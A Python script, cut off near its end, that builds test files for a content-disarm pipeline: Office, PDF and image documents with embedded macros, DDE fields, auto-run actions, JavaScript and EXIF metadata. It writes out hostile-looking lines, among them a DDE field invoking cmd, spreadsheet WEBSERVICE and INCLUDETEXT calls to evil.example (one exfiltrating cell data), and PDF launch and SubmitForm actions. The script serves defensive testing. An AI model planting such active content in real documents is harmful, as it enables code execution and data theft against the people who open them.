"""
Generate sample fixture files with embedded active content for CDR pipeline testing.

Each fixture is a real file that CDR should fully disarm. Run this script once to
produce the files, then upload them to the source bucket and verify the pipeline
strips every threat.

Usage:
    cd repo-root
    source bin/activate
    python docs/fixtures/generate_fixtures.py

    # Upload all fixtures for smoke / benchmark testing
    aws s3 cp docs/fixtures/ s3://$SOURCE_BUCKET/smoke/ --recursive --exclude "*.py" --exclude "*.md"

Output files:
    docx_vba_macro.docx               - DOCX: vbaProject.bin + MACROBUTTON field + VBA rel
    docx_external_link.docx           - DOCX: externalLink relationship + externalLinks/ entry
    docx_dde_field.docx               - DOCX: DDE field code in document.xml
    docx_autoopen_field.docx          - DOCX: AUTOOPEN field code in document.xml
    docx_multithreat.docx             - DOCX: VBA + external link + macro CT + MACROBUTTON + AUTOOPEN
    xlsm_vba.xlsm                     - XLSM: vbaProject.bin + macro-enabled content type
    xlsx_dde_formula.xlsx             - XLSX: DDE cell formula (=DDE(...) in sheet XML)
    xlsb_sheet_binary.xlsb            - XLSB: sheet1.bin triggers cdr_xlsb() conversion path
    pptx_activex.pptx                 - PPTX: activeX1.bin entry + control relationship
    pdf_openaction_js.pdf             - PDF: /OpenAction JavaScript trigger
    pdf_embedded_file.pdf             - PDF: /EmbeddedFiles with an attached .exe
    pdf_acroform_js.pdf               - PDF: AcroForm field /AA JavaScript action
    pdf_page_launch.pdf               - PDF: page-level /AA /O /Launch action
    pdf_multithreat.pdf               - PDF: /OpenAction + /EmbeddedFiles + AcroForm JS
    gif_comment_block.gif             - GIF: comment extension block (0x21 0xFE)
    tiff_multiframe_exif.tiff         - TIFF: 3-frame TIFF with EXIF metadata in every frame
    jpeg_with_exif.jpg                - JPEG: GPS + camera model EXIF tags
"""

import io
import os
import struct
import sys
import zipfile
from pathlib import Path

# Allow import from src/ for _make_xlsb helper
_REPO_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(_REPO_ROOT / "src"))

import pikepdf
from PIL import Image, ImageSequence

OUT_DIR = Path(__file__).parent


# ── Helpers ────────────────────────────────────────────────────────────────────

def _rels_ns() -> str:
    return "http://schemas.openxmlformats.org/package/2006/relationships"


def _minimal_rels(extra: str = "") -> bytes:
    ns = _rels_ns()
    return (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Relationships xmlns="{ns}">{extra}</Relationships>'
    ).encode()


def _content_types(*overrides: tuple[str, str], **defaults: str) -> bytes:
    ns = "http://schemas.openxmlformats.org/package/2006/content-types"
    parts = [
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
        f'<Types xmlns="{ns}">',
        f'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>',
        f'<Default Extension="xml" ContentType="application/xml"/>',
    ]
    for part, ct in overrides:
        parts.append(f'<Override PartName="{part}" ContentType="{ct}"/>')
    parts.append("</Types>")
    return "\n".join(parts).encode()


def _rel(rel_id: str, rel_type: str, target: str) -> str:
    return f'<Relationship Id="{rel_id}" Type="{rel_type}" Target="{target}"/>'


def _word_body(*paragraphs: str) -> bytes:
    wml = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
    paras = "".join(
        f'<w:p xmlns:w="{wml}"><w:r><w:t>{p}</w:t></w:r></w:p>'
        for p in paragraphs
    )
    return (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<w:document xmlns:w="{wml}"><w:body>{paras}</w:body></w:document>'
    ).encode()


def _write(name: str, data: bytes) -> None:
    path = OUT_DIR / name
    path.write_bytes(data)
    kb = len(data) / 1024
    print(f"  written  {name}  ({kb:.1f} KB)")


# ── Office fixture helpers ─────────────────────────────────────────────────────

VBA_BIN_MAGIC = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 488  # OLE header + padding

def _vba_project_bin() -> bytes:
    """Minimal OLE compound document magic so the file looks like a real vbaProject."""
    return VBA_BIN_MAGIC + b"MACRO_PAYLOAD_STUB"


# ── DOCX fixtures ─────────────────────────────────────────────────────────────

def make_docx_vba_macro() -> bytes:
    """DOCX with vbaProject.bin, VBA relationship, macro-enabled CT, MACROBUTTON field."""
    wml = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
    vba_type = "http://schemas.microsoft.com/office/2006/relationships/vbaProject"

    # document.xml contains a MACROBUTTON field code
    doc_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<w:document xmlns:w="{wml}">'
        '<w:body>'
        '<w:p><w:r><w:t>CDR Test: VBA Macro Document</w:t></w:r></w:p>'
        '<w:p>'
        '<w:fldSimple w:instr=" MACROBUTTON HiddenButton Click me ">'
        '<w:r><w:t>Click</w:t></w:r>'
        '</w:fldSimple>'
        '</w:p>'
        '</w:body>'
        '</w:document>'
    ).encode()

    doc_rels = _minimal_rels(
        _rel("rId1", vba_type, "vbaProject.bin")
    )

    ct = _content_types(
        ("/word/document.xml",
         "application/vnd.ms-word.document.macroEnabled.main+xml"),
    )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("word/_rels/document.xml.rels", doc_rels)
        z.writestr("word/document.xml", doc_xml)
        z.writestr("word/vbaProject.bin", _vba_project_bin())
    return buf.getvalue()


def make_docx_external_link() -> bytes:
    """DOCX with an externalLink relationship pointing to an external URL."""
    wml = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
    ext_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink"

    doc_rels = _minimal_rels(
        _rel("rId1", ext_type, "externalLinks/externalLink1.xml")
    )

    ext_link_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<externalLink xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        '<externalBook xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
        ' r:id="rId1"/>'
        '</externalLink>'
    ).encode()

    doc_xml = _word_body("CDR Test: External Link Document")

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _content_types())
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("word/_rels/document.xml.rels", doc_rels)
        z.writestr("word/document.xml", doc_xml)
        z.writestr("word/externalLinks/externalLink1.xml", ext_link_xml)
    return buf.getvalue()


def make_docx_dde_field() -> bytes:
    """DOCX with a DDE field code that points to an external application."""
    wml = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"

    # Embed DDE field code directly in paragraph instrText
    doc_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<w:document xmlns:w="{wml}">'
        '<w:body>'
        '<w:p><w:r><w:t>CDR Test: DDE Field Document</w:t></w:r></w:p>'
        '<w:p>'
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText xml:space="preserve"> DDE WINWORD "C:\\\\windows\\\\system32\\\\cmd" "/c calc" </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        '<w:r><w:t>DDE result placeholder</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        '</w:p>'
        '</w:body>'
        '</w:document>'
    ).encode()

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _content_types(
            ("/word/document.xml",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"),
        ))
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("word/_rels/document.xml.rels", _minimal_rels())
        z.writestr("word/document.xml", doc_xml)
    return buf.getvalue()


def make_docx_autoopen_field() -> bytes:
    """DOCX with AUTOOPEN and AUTOEXIT field codes — auto-execute on open/close."""
    wml = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"

    doc_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<w:document xmlns:w="{wml}">'
        '<w:body>'
        '<w:p><w:r><w:t>CDR Test: Auto-Execute Fields</w:t></w:r></w:p>'
        '<w:p>'
        '<w:fldSimple w:instr=" AUTOOPEN ">'
        '<w:r><w:t>auto open payload</w:t></w:r>'
        '</w:fldSimple>'
        '</w:p>'
        '<w:p>'
        '<w:fldSimple w:instr=" AUTOEXIT macro_name ">'
        '<w:r><w:t>auto exit payload</w:t></w:r>'
        '</w:fldSimple>'
        '</w:p>'
        '<w:p>'
        '<w:fldSimple w:instr=" WEBSERVICE http://evil.example/collect ">'
        '<w:r><w:t>webservice result</w:t></w:r>'
        '</w:fldSimple>'
        '</w:p>'
        '</w:body>'
        '</w:document>'
    ).encode()

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _content_types(
            ("/word/document.xml",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"),
        ))
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("word/_rels/document.xml.rels", _minimal_rels())
        z.writestr("word/document.xml", doc_xml)
    return buf.getvalue()


def make_docx_multithreat() -> bytes:
    """DOCX with every active content type at once: VBA + ext link + macro CT + field codes."""
    wml = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
    vba_type = "http://schemas.microsoft.com/office/2006/relationships/vbaProject"
    ext_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink"

    doc_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<w:document xmlns:w="{wml}">'
        '<w:body>'
        '<w:p><w:r><w:t>CDR Test: Multi-Threat Document</w:t></w:r></w:p>'
        # MACROBUTTON
        '<w:p>'
        '<w:fldSimple w:instr=" MACROBUTTON HiddenButton Click ">'
        '<w:r><w:t>run macro</w:t></w:r>'
        '</w:fldSimple>'
        '</w:p>'
        # DDE
        '<w:p>'
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText> DDE EXCEL Sheet1!R1C1 </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        '<w:r><w:t>dde result</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        '</w:p>'
        # AUTOOPEN
        '<w:p>'
        '<w:fldSimple w:instr=" AUTOOPEN auto_run ">'
        '<w:r><w:t>auto</w:t></w:r>'
        '</w:fldSimple>'
        '</w:p>'
        # INCLUDETEXT (remote content injection)
        '<w:p>'
        '<w:fldSimple w:instr=\' INCLUDETEXT "http://evil.example/payload.docx" \'>'
        '<w:r><w:t>remote content</w:t></w:r>'
        '</w:fldSimple>'
        '</w:p>'
        '</w:body>'
        '</w:document>'
    ).encode()

    doc_rels = _minimal_rels(
        _rel("rId1", vba_type, "vbaProject.bin") +
        _rel("rId2", ext_type, "externalLinks/externalLink1.xml")
    )

    ct = _content_types(
        ("/word/document.xml",
         "application/vnd.ms-word.document.macroEnabled.main+xml"),
    )

    ext_link_xml = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>'
    )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("word/_rels/document.xml.rels", doc_rels)
        z.writestr("word/document.xml", doc_xml)
        z.writestr("word/vbaProject.bin", _vba_project_bin())
        z.writestr("word/externalLinks/externalLink1.xml", ext_link_xml)
    return buf.getvalue()


# ── Excel / spreadsheet fixtures ──────────────────────────────────────────────

def make_xlsm_vba() -> bytes:
    """XLSM with vbaProject.bin, VBA relationship, macro-enabled content type."""
    sml = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
    vba_type = "http://schemas.microsoft.com/office/2006/relationships/vbaProject"
    sheet_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"

    workbook_xml = (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<workbook xmlns="{sml}">'
        f'<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"'
        f' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
        f'</sheets></workbook>'
    ).encode()

    sheet_xml = (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<worksheet xmlns="{sml}">'
        f'<sheetData>'
        f'<row r="1"><c r="A1" t="str"><v>CDR Test XLSM</v></c></row>'
        f'</sheetData>'
        f'</worksheet>'
    ).encode()

    wb_rels = _minimal_rels(
        _rel("rId1", sheet_type, "worksheets/sheet1.xml") +
        _rel("rId2", vba_type, "vbaProject.bin")
    )

    ct = _content_types(
        ("/xl/workbook.xml",
         "application/vnd.ms-excel.sheet.macroEnabled.main+xml"),
        ("/xl/worksheets/sheet1.xml",
         "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"),
    )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("xl/_rels/workbook.xml.rels", wb_rels)
        z.writestr("xl/workbook.xml", workbook_xml)
        z.writestr("xl/worksheets/sheet1.xml", sheet_xml)
        z.writestr("xl/vbaProject.bin", _vba_project_bin())
    return buf.getvalue()


def make_xlsx_dde_formula() -> bytes:
    """XLSX with a DDE formula and an INCLUDETEXT-style WEBSERVICE call in a cell."""
    sml = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
    sheet_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"

    # Cell A1 has a DDE formula; B1 has WEBSERVICE; C1 is plain text for comparison
    sheet_xml = (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<worksheet xmlns="{sml}">'
        f'<sheetData>'
        f'<row r="1">'
        f'<c r="A1"><f>DDE("WINWORD","C:\\\\windows\\\\system32\\\\cmd /c calc")</f><v>0</v></c>'
        f'<c r="B1"><f>WEBSERVICE("http://evil.example/exfil?data="&amp;A1)</f><v>0</v></c>'
        f'<c r="C1" t="str"><v>plain text control</v></c>'
        f'</row>'
        f'</sheetData>'
        f'</worksheet>'
    ).encode()

    workbook_xml = (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<workbook xmlns="{sml}">'
        f'<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"'
        f' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
        f'</sheets></workbook>'
    ).encode()

    wb_rels = _minimal_rels(_rel("rId1", sheet_type, "worksheets/sheet1.xml"))

    ct = _content_types(
        ("/xl/workbook.xml",
         "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"),
        ("/xl/worksheets/sheet1.xml",
         "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"),
    )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("xl/_rels/workbook.xml.rels", wb_rels)
        z.writestr("xl/workbook.xml", workbook_xml)
        z.writestr("xl/worksheets/sheet1.xml", sheet_xml)
    return buf.getvalue()


def make_xlsb_sheet_binary() -> bytes:
    """XLSB with a real sheet1.bin — triggers the cdr_xlsb() conversion path."""
    # Import the BIFF12 fixture builder from the test suite
    os.environ.setdefault("SANITISED_BUCKET", "x")
    import test_cdr
    return test_cdr._make_xlsb(rows=[
        [1.0, 2.0, 3.0],
        [4.0, 5.0, 6.0],
        [7.0, 8.0, 9.0],
    ])


# ── PowerPoint fixture ─────────────────────────────────────────────────────────

def make_pptx_activex() -> bytes:
    """PPTX with an ActiveX control entry and control relationship."""
    pml = "http://schemas.openxmlformats.org/presentationml/2006/main"
    ctrl_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/control"
    slide_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide"

    prs_xml = (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<p:presentation xmlns:p="{pml}">'
        f'<p:sldMasterIdLst/>'
        f'<p:sldIdLst><p:sldId id="256" r:id="rId1"'
        f' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></p:sldIdLst>'
        f'<p:sldSz cx="9144000" cy="6858000"/>'
        f'</p:presentation>'
    ).encode()

    slide_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">'
        '<p:cSld><p:spTree>'
        '<p:sp><p:nvSpPr><p:cNvPr id="1" name="Title 1"/>'
        '<p:cNvSpPr/><p:nvPr/></p:nvSpPr>'
        '<p:spPr/><p:txBody><a:bodyPr xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>'
        '<a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">'
        '<a:r><a:t>CDR Test: ActiveX Slide</a:t></a:r></a:p></p:txBody>'
        '</p:sp>'
        '</p:spTree></p:cSld>'
        '</p:sld>'
    ).encode()

    # ActiveX control: a minimal OLE compound doc stub
    activex_bin = b"\xd0\xcf\x11\xe0" + b"\x00" * 64 + b"ACTIVEX_STUB"

    slide_rels = _minimal_rels(
        _rel("rId1", ctrl_type, "../activeX/activeX1.bin")
    )

    prs_rels = _minimal_rels(
        _rel("rId1", slide_type, "slides/slide1.xml")
    )

    ct = _content_types(
        ("/ppt/presentation.xml",
         "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"),
        ("/ppt/slides/slide1.xml",
         "application/vnd.openxmlformats-officedocument.presentationml.slide+xml"),
    )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("ppt/_rels/presentation.xml.rels", prs_rels)
        z.writestr("ppt/presentation.xml", prs_xml)
        z.writestr("ppt/slides/_rels/slide1.xml.rels", slide_rels)
        z.writestr("ppt/slides/slide1.xml", slide_xml)
        z.writestr("ppt/activeX/activeX1.bin", activex_bin)
    return buf.getvalue()


# ── PDF fixtures ───────────────────────────────────────────────────────────────

def make_pdf_openaction_js() -> bytes:
    """PDF with /OpenAction JavaScript trigger (app.alert on open)."""
    pdf = pikepdf.Pdf.new()
    page = pdf.make_indirect(pikepdf.Dictionary(
        Type=pikepdf.Name("/Page"),
        MediaBox=pikepdf.Array([0, 0, 612, 792]),
    ))
    pdf.pages.append(pikepdf.Page(page))
    pdf.Root["/OpenAction"] = pikepdf.Dictionary(
        S=pikepdf.Name("/JavaScript"),
        JS=pikepdf.String("app.alert('CDR Test: OpenAction JS'); this.exportDataObject({cName:'evil',nLaunch:2});"),
    )
    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


def make_pdf_embedded_file() -> bytes:
    """PDF with /EmbeddedFiles name tree containing a .exe attachment."""
    pdf = pikepdf.Pdf.new()
    page = pdf.make_indirect(pikepdf.Dictionary(
        Type=pikepdf.Name("/Page"),
        MediaBox=pikepdf.Array([0, 0, 612, 792]),
    ))
    pdf.pages.append(pikepdf.Page(page))

    # Build an embedded file stream (fake .exe content)
    ef_stream = pdf.make_stream(
        b"MZ\x90\x00FAKE_PE_HEADER",
        {
            "/Type": pikepdf.Name("/EmbeddedFile"),
            "/Subtype": pikepdf.Name("/application#2Foctet-stream"),
        }
    )
    ef_stream_indirect = pdf.make_indirect(ef_stream)

    file_spec = pdf.make_indirect(pikepdf.Dictionary(
        Type=pikepdf.Name("/Filespec"),
        F=pikepdf.String("evil.exe"),
        UF=pikepdf.String("evil.exe"),
        EF=pikepdf.Dictionary(
            F=ef_stream_indirect,
        ),
        Desc=pikepdf.String("CDR Test: Embedded file"),
    ))

    pdf.Root["/Names"] = pikepdf.Dictionary(
        EmbeddedFiles=pikepdf.Dictionary(
            Names=pikepdf.Array([
                pikepdf.String("evil.exe"),
                file_spec,
            ])
        )
    )

    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


def make_pdf_acroform_js() -> bytes:
    """PDF with AcroForm field that has /AA (Additional Actions) JavaScript."""
    pdf = pikepdf.Pdf.new()
    page = pdf.make_indirect(pikepdf.Dictionary(
        Type=pikepdf.Name("/Page"),
        MediaBox=pikepdf.Array([0, 0, 612, 792]),
    ))
    pdf.pages.append(pikepdf.Page(page))

    # Widget annotation with JavaScript in /AA (focus action)
    widget = pdf.make_indirect(pikepdf.Dictionary(
        Type=pikepdf.Name("/Annot"),
        Subtype=pikepdf.Name("/Widget"),
        FT=pikepdf.Name("/Tx"),
        T=pikepdf.String("field1"),
        Rect=pikepdf.Array([100, 700, 300, 720]),
        AA=pikepdf.Dictionary(
            Fo=pikepdf.Dictionary(  # On Focus
                S=pikepdf.Name("/JavaScript"),
                JS=pikepdf.String("app.alert('CDR Test: AcroForm focus JS');"),
            ),
            Bl=pikepdf.Dictionary(  # On Blur
                S=pikepdf.Name("/JavaScript"),
                JS=pikepdf.String("this.getField('field1').value = unescape('%65%76%69%6c');"),
            ),
        ),
    ))

    # Wire annotation to page and AcroForm
    page_obj = pdf.pages[0].obj
    page_obj["/Annots"] = pikepdf.Array([widget])

    pdf.Root["/AcroForm"] = pikepdf.Dictionary(
        Fields=pikepdf.Array([widget]),
        DR=pikepdf.Dictionary(),
        DA=pikepdf.String("/Helv 12 Tf 0 g"),
    )

    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


def make_pdf_page_launch() -> bytes:
    """PDF with page /AA /O (Open) action that launches an external application."""
    pdf = pikepdf.Pdf.new()
    page_dict = pikepdf.Dictionary(
        Type=pikepdf.Name("/Page"),
        MediaBox=pikepdf.Array([0, 0, 612, 792]),
        AA=pikepdf.Dictionary(
            O=pikepdf.Dictionary(  # On Open
                S=pikepdf.Name("/Launch"),
                F=pikepdf.Dictionary(
                    Type=pikepdf.Name("/Filespec"),
                    F=pikepdf.String("C:\\\\windows\\\\system32\\\\calc.exe"),
                ),
            ),
        ),
    )
    pdf.pages.append(pikepdf.Page(pdf.make_indirect(page_dict)))

    # Also add a /SubmitForm annotation
    submit_annot = pdf.make_indirect(pikepdf.Dictionary(
        Type=pikepdf.Name("/Annot"),
        Subtype=pikepdf.Name("/Widget"),
        FT=pikepdf.Name("/Btn"),
        T=pikepdf.String("submit"),
        Rect=pikepdf.Array([100, 100, 200, 120]),
        A=pikepdf.Dictionary(
            S=pikepdf.Name("/SubmitForm"),
            F=pikepdf.Dictionary(
                Type=pikepdf.Name("/Filespec"),
                F=pikepdf.String("http://evil.example/collect"),
            ),
            Flags=pikepdf.Array([4]),
        ),
    ))
    pdf.pages[0].obj["/Annots"] = pikepdf.Array([submit_annot])

    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


def make_pdf_multithreat() -> bytes:
    """PDF with /OpenAction JS + /EmbeddedFiles + AcroForm JS + page /AA /Launch."""
    pdf = pikepdf.Pdf.new()
    page_dict = pikepdf.Dictionary(
        Type=pikepdf.Name("/Page"),
        MediaBox=pikepdf.Array([0, 0, 612, 792]),
        AA=pikepdf.Dictionary(
            O=pikepdf.Dictionary(
                S=pikepdf.Name("/Launch"),
                F=pikepdf.Dictionary(
                    Type=pikepdf.Name("/Filespec"),
                    F=pikepdf.String("calc.exe"),
                ),
            ),
        ),
    )
    pdf.pages.append(pikepdf.Page(pdf.make_indirect(page_dict)))

    # /OpenAction
    pdf.Root["/OpenAction"] = pikepdf.Dictionary(
        S=pikepdf.Name("/JavaScript"),
        JS=pikepdf.String("app.alert('CDR Test: Multi-threat PDF');"),
    )

    # /EmbeddedFiles
    ef_stream = pdf.make_stream(b"MALWARE_PAYLOAD")
    file_spec = pdf.make_indirect(pikepdf.Dictionary(
        Type=pikepdf.Name("/Filespec"),
        F=pikepdf.String("payload.exe"),
        EF=pikepdf.Dictionary(F=pdf.make_indirect(ef_stream)),
    ))
    pdf.Root["/Names"] = pikepdf.Dictionary(
        EmbeddedFiles=pikepdf.Dictionary(
            Names=pikepdf.Array([pikepdf.String("payload.exe"), file_spec])
        )
    )

    # AcroForm with JS
    widget = pdf.make_indirect(pikepdf.Dictionary(
        Type=pikepdf.Name("/Annot"),
        Subtype=pikepdf.Name("/Widget"),
        FT=pikepdf.Name("/Tx"),
        T=pikepdf.String("f"),
        Rect=pikepdf.Array([0, 0, 1, 1]),
        AA=pikepdf.Dictionary(
            Fo=pikepdf.Dictionary(
                S=pikepdf.Name("/JavaScript"),
                JS=pikepdf.String("app.alert('field focus');"),
            ),
        ),
    ))
    pdf.pages[0].obj["/Annots"] = pikepdf.Array([widget])
    pdf.Root["/AcroForm"] = pikepdf.Dictionary(
        Fields=pikepdf.Array([widget]),
        DR=pikepdf.Dictionary(),
        DA=pikepdf.String("/Helv 12 Tf 0 g"),
    )

    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


# ── Image fixtures ─────────────────────────────────────────────────────────────

def make_gif_comment_block() -> bytes:
    """GIF with a comment extension block (0x21 0xFE) carrying a hidden payload."""
    img = Image.new("RGB", (64, 64), color=(255, 0, 128))
    buf = io.BytesIO()
    img.save(buf, format="GIF",
             comment=b"CDR_TEST_HIDDEN_PAYLOAD: EXFIL_TOKEN=abc123 BEACON_URL=http://evil.example")
    raw = buf.getvalue()
    # Confirm the comment block was embedded before returning
    assert b"\x21\xfe" in raw, "Pillow did not embed GIF comment extension — fixture invalid"
    return raw


def make_tiff_multiframe_exif() -> bytes:
    """Multi-frame TIFF (3 frames) with EXIF GPS coordinates in every frame."""

    def _make_exif_with_gps() -> bytes:
        """Build a minimal EXIF block containing GPS IFD with lat/lon coordinates."""
        # TIFF little-endian header
        tiff_header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)

        # GPS IFD: latitude and longitude rational values
        # GPS IFD offset (will be after main IFD)
        # For simplicity, we embed a camera make tag + GPS pointer
        # Tag 0x010F (Make), ASCII "CDRTestCamera\0"
        make_str = b"CDRTestCamera\x00"
        # Tag 0x8825 (GPSInfoIFD), LONG pointing to GPS IFD
        # Offset layout: IFD at 8, GPS IFD after IFD data
        n_entries = 2
        ifd_size = 2 + n_entries * 12 + 4  # count + entries + next IFD
        ifd_data_offset = 8 + ifd_size
        gps_ifd_offset = ifd_data_offset + len(make_str)

        ifd = struct.pack("<H", n_entries)
        # Make tag: ASCII, count=len, value_offset points to make_str
        ifd += struct.pack("<HHI", 0x010F, 2, len(make_str))
        ifd += struct.pack("<I", ifd_data_offset)
        # GPSInfoIFD tag: LONG, count=1, value=gps_ifd_offset
        ifd += struct.pack("<HHI", 0x8825, 4, 1)
        ifd += struct.pack("<I", gps_ifd_offset)
        ifd += struct.pack("<I", 0)  # next IFD = 0

        # GPS IFD: 2 entries (GPSLatitude + GPSLongitude) — rational arrays
        n_gps = 2
        gps_data_offset = gps_ifd_offset + 2 + n_gps * 12 + 4
        # Each rational: 3 x (numerator, denominator) = 24 bytes
        lat_offset = gps_data_offset
        lon_offset = gps_data_offset + 24

        gps_ifd = struct.pack("<H", n_gps)
        # GPSLatitude (0x0002): RATIONAL, count=3
        gps_ifd += struct.pack("<HHI", 0x0002, 5, 3)
        gps_ifd += struct.pack("<I", lat_offset)
        # GPSLongitude (0x0004): RATIONAL, count=3
        gps_ifd += struct.pack("<HHI", 0x0004, 5, 3)
        gps_ifd += struct.pack("<I", lon_offset)
        gps_ifd += struct.pack("<I", 0)  # next GPS IFD

        # Rational data: 1°2'3.456" = [1/1, 2/1, 3456/1000]
        lat_data = struct.pack("<IIIIII", 1, 1, 2, 1, 3456, 1000)
        lon_data = struct.pack("<IIIIII", 103, 1, 48, 1, 12345, 1000)

        exif_body = tiff_header + ifd + make_str + gps_ifd + lat_data + lon_data
        return b"Exif\x00\x00" + exif_body

    exif_bytes = _make_exif_with_gps()

    frames = []
    colors = [(255, 0, 0), (0, 255, 0), (0, 0, 255)]
    for color in colors:
        frame = Image.new("RGB", (64, 64), color=color)
        frames.append(frame)

    buf = io.BytesIO()
    frames[0].save(
        buf,
        format="TIFF",
        save_all=True,
        append_images=frames[1:],
        exif=exif_bytes,
    )
    return buf.getvalue()


def make_jpeg_with_exif() -> bytes:
    """JPEG with GPS coordinates, camera make/model, and copyright EXIF tags."""
    tiff_header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)

    make_str = b"CDRTestCamera\x00"
    model_str = b"CDRTestModel X1\x00"
    copyright_str = b"Copyright 2026 CDR Test\x00"

    n_entries = 3
    ifd_size = 2 + n_entries * 12 + 4
    base_offset = 8 + ifd_size

    make_off = base_offset
    model_off = make_off + len(make_str)
    copy_off = model_off + len(model_str)

    ifd = struct.pack("<H", n_entries)
    ifd += struct.pack("<HHI", 0x010F, 2, len(make_str)) + struct.pack("<I", make_off)
    ifd += struct.pack("<HHI", 0x0110, 2, len(model_str)) + struct.pack("<I", model_off)
    ifd += struct.pack("<HHI", 0x8298, 2, len(copyright_str)) + struct.pack("<I", copy_off)
    ifd += struct.pack("<I", 0)

    exif_bytes = b"Exif\x00\x00" + tiff_header + ifd + make_str + model_str + copyright_str

    img = Image.new("RGB", (128, 128), color=(64, 128, 192))
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=85, exif=exif_bytes)
    return buf.getvalue()


# ── Main ───────────────────────────────────────────────────────────────────────

FIXTURES: list[tuple[str, object]] = [
    # (filename, generator_function)
    ("docx_vba_macro.docx",          make_docx_vba_macro),
